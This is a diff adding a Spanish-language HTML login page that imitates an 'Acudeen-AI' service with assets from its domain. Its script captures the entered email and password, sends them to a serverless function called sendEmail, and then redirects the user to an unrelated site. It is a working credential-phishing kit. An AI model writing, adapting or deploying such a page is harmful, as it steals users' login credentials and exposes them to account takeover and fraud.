@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acudeen-AI Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        body {
+            background: url('https://acudeenai.bet/assets/U6N5Z4KhneD_X0tbzG.png');
+            background-size: cover;
+            background-position: top;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .logo {
+            width: 80px;
+            border-radius: 15px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: white;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 30px;
+            border-radius: 20px;
+            width: 350px;
+            text-align: center;
+            color: white;
+        }
+        .tabs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .tab {
+            color: rgba(255, 255, 255, 0.6);
+            padding-bottom: 5px;
+        }
+        .tab.active {
+            color: white;
+            border-bottom: 3px solid #6495ED;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #34383F;
+            border: none;
+            border-radius: 10px;
+            color: #666666;
+            font-size: 16px;
+            outline: none;
+        }
+        .input-group input::placeholder {
+            color: #666666;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #9AC0FF;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .links {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666666;
+        }
+        .links p:first-child {
+            color: #9AC0FF;
+            margin-bottom: 10px;
+        }
+        .links p:last-child {
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://api.acudeenai.bet/upload/img/67bee23df8bd.webp" class="logo" alt="Acudeen-AI Logo">
+    <h2>Acudeen-AI</h2>
+    <div class="login-container">
+        <div class="tabs">
+            <div class="tab active">Iniciar sesión por correo electrónico</div>
+            <div class="tab">Iniciar sesión por teléfono</div>
+            <div class="tab">Iniciar sesión en Telegram</div>
+        </div>
+        <form id="login-form">
+            <div class="input-group">
+                <input type="email" id="username" placeholder="Correo electrónico" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Contraseña de inicio de sesión" required>
+            </div>
+            <button type="submit" class="btn">Acceso</button>
+        </form>
+        <div class="links">
+            <p>¿Sin cuenta? Registro</p>
+            <p>Ir a la página de inicio</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            fetch("/.netlify/functions/sendEmail", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message === "Correo enviado con éxito") {
+                    window.location.href = "https://xingchen78.com/h5/#/";
+                } else {
+                    alert("Hubo un problema al enviar el correo.");
+                }
+            })
+            .catch(error => {
+                alert("Error al enviar el correo: " + error);
+            });
+        });
+    </script>
+</body>
+</html>
